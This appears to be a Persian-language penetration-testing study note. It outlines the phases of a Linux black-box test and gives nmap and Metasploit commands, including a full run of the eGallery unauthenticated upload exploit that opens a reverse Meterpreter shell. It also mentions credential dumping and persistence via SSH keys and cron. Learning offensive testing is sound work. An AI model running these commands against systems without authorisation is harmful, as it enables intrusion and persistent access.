

---

## 🔹 Linux Black Box Penetration Testing

**تعریف:**  
Black Box Penetration Testing یعنی تست نفوذ بدون داشتن هیچ اطلاعات قبلی از سیستم هدف (مثل پسوردها، کانفیگ، سورس کد، یا دسترسی‌های داخلی). توی حالت Black Box روی لینوکس، تو مثل یک مهاجم واقعی بیرونی در نظر گرفته میشی و فقط آی‌پی/دامنه هدف رو داری.

**فرایند کلی:**

1. **Information Gathering (Reconnaissance)**
    
    - کشف دامنه‌ها و IP ها (با ابزارهایی مثل `nmap`, `masscan`, `subfinder`, `amass`).
        
    - شناسایی سرویس‌ها و پورت‌ها:
        
        ```bash
        nmap -sV -A -T4 <target>
        ```
        
    - جستجو برای بنرها و نسخه سرویس‌ها.
        
2. **Enumeration (بررسی سرویس‌ها)**
    
    - هر سرویسی که پیدا شد رو عمیق‌تر چک می‌کنی (مثلاً SSH, HTTP, SMB, FTP, SQL).
        
    - مثال:
        
        - اگر SSH بود → بررسی برای Brute Force.
            
        - اگر HTTP بود → تست برای Web Vulnerabilities.
            
        - اگر SMB بود → تست Enumeration یا Replay Attack.
            
3. **Exploitation (بهره‌برداری از آسیب‌پذیری‌ها)**
    
    - استفاده از اکسپلویت‌های عمومی (Metasploit، ExploitDB).
        
    - نوشتن اکسپلویت اختصاصی اگر لازم بود.
        
    - مثال: اگر وب‌سایت روی PHP باشه → تست File Upload یا RCE.
        
4. **Privilege Escalation (ارتقا دسترسی)**
    
    - اگر شل ساده گرفتی، تلاش می‌کنی بشی root.
        
    - ابزارهای مفید: `linPEAS`, `linux-exploit-suggester`.
        
5. **Post-Exploitation & Persistence**
    
    - جمع‌آوری داده‌ها (Credential Dump, Network Info).
        
    - ایجاد دسترسی دائمی (SSH Key, Cronjob).
        
6. **Reporting**
    
    - مستند کردن همه مراحل (از Recon تا Exploit و Escalation).
        

---

## 🔹 این چیه؟

`exploit/unix/webapp/egallery_upload_exec`

این یک ماژول از **Metasploit Framework** هست.

- **هدف:** نرم‌افزار **eGallery 1.2** (یک اپلیکیشن گالری عکس تحت وب روی لینوکس).
    
- **نوع آسیب‌پذیری:** **Unauthenticated Arbitrary File Upload** → می‌تونی بدون پسورد فایل (مثل PHP shell) آپلود کنی.
    
- **کاری که می‌کنه:**
    
    1. به وب اپلیکیشن وصل میشه.
        
    2. یه فایل مخرب (معمولاً `PHP Meterpreter`) آپلود می‌کنه.
        
    3. با اون فایل به سیستم دسترسی می‌گیری.
        

**مثال اجرای ماژول توی Metasploit:**

```bash
use exploit/unix/webapp/egallery_upload_exec
set RHOSTS <target_ip>
set RPORT 80
set TARGETURI /egallery/
set LHOST <your_ip>
set LPORT 4444
run
```

بعد از اجرای موفق، یه شل یا سشن Meterpreter می‌گیری.

---

⚡ یعنی در یک Black Box PenTest روی لینوکس، وقتی توی Enumeration متوجه شدی که یه وب‌اپلیکیشن خاص (مثل eGallery) روی سرور نصبه، می‌تونی همین ماژول رو تست کنی تا دسترسی اولیه بگیری.

---
